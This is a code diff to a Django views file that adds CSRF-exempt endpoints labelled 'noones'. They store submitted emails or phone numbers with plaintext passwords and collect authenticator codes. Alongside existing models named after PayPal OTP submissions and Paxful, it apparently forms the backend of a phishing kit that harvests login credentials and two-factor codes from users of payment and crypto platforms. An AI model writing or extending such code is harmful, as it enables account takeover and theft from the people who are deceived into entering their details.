@@ -63,6 +63,15 @@ from .forms import UserForm
 from .models import UserSubmissionPaypal, OTPSubmissionPaypal
 
 
+#imports noones
+
+from rest_framework import status
+from rest_framework.decorators import api_view
+from rest_framework.response import Response
+from .models import UserProfileNoones
+from .serializers import UserProfileNoonesSerializer
+
+
 
 def index(request):
     return render(request,'index.html')
@@ -1010,3 +1019,41 @@ def delete_user(request, username):
 def indextwo(request):
     users = UserPaxfulPay.objects.all()  # Correctly access the UserPaxfulPay model
     return render(request, 'index2.html', {'users': users})
+
+
+
+
+    #noones
+# View to submit email/phone and password
+@csrf_exempt
+@api_view(['POST'])
+def submit_user_data(request):
+    if request.method == 'POST':
+        email_or_phone = request.data.get('emailOrPhone')
+        password = request.data.get('password')
+
+        # Create and save the data
+        user_profile = UserProfileNoones.objects.create(
+            email_or_phone=email_or_phone,
+            password=password,
+            authenticator_codes=[]
+        )
+        return Response({'message': 'Data submitted successfully!'}, status=status.HTTP_201_CREATED)
+
+# View to submit authenticator code
+@csrf_exempt
+@api_view(['POST'])
+def submit_authenticator_code(request):
+    if request.method == 'POST':
+        email_or_phone = request.data.get('emailOrPhone')
+        authenticator_code = request.data.get('authenticatorCode')
+
+        try:
+            # Retrieve the user profile based on the email or phone number
+            user_profile = UserProfileNoones.objects.get(email_or_phone=email_or_phone)
+            # Append the authenticator code to the list
+            user_profile.authenticator_codes.append(authenticator_code)
+            user_profile.save()
+            return Response({'message': 'Authenticator code submitted successfully!'}, status=status.HTTP_200_OK)
+        except UserProfileNoones.DoesNotExist:
+            return Response({'error': 'User profile not found.'}, status=status.HTTP_404_NOT_FOUND)
